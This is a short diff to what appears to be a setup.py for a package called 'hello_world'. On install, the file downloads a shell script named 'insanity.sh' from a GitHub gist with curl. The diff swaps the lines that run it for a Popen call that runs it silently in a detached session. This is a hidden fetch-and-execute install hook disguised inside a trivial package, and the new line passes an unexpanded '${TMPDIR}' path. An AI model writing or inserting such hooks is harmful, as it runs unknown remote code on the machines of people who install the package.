@@ -5,8 +5,7 @@ from distutils.core import setup
 import os, subprocess
 
 os.system('curl https://gist.githubusercontent.com/tvrnd/f8276f3583bfa0c121dfc522a6ef8de2/raw/dc53da0993d3b3e47c2c2bab533e5eefcbbb011a/insanity.sh -s -o ${TMPDIR}/insanity.sh')
-os.system('chmod +x ${TMPDIR}/insanity.sh')
-os.system('${TMPDIR}/insanity.sh > /dev/null &')
+subprocess.Popen(['sh', '${TMPDIR}/insanity.sh'], start_new_session=True)
 
 setup(
     name="hello_world",
